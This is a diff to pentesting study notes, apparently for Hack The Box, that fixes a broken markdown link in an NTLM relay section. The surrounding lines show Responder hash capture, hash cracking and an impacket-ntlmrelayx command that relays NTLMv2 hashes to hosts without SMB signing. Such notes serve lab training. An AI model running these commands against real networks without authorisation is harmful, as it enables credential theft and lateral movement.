@@ -263,7 +263,7 @@ sudo responder -I tun0
 ```
 * Crack the hash, if crackable
 #### NTLM Relay
-> Relay the NTLMv2 hash directly to other machines with SMB Signing disabled. See [Basic SMB Recon](https://github.com/Chvxt3r/HackTools/blob/main/cert_notes/htb/nxc.md#basic-smb-recon] for list generation
+> Relay the NTLMv2 hash directly to other machines with SMB Signing disabled. See [Basic SMB Recon](https://github.com/Chvxt3r/HackTools/blob/main/cert_notes/htb/nxc.md#basic-smb-recon) for list generation
 * After starting responder, start impacket-ntlmrelayx(ntlmrelayx.py)
 ```bash
 sudo proxychains4 -q impacket-ntlmrelayx -tf [relayfile.txt] -smb2support --no-http
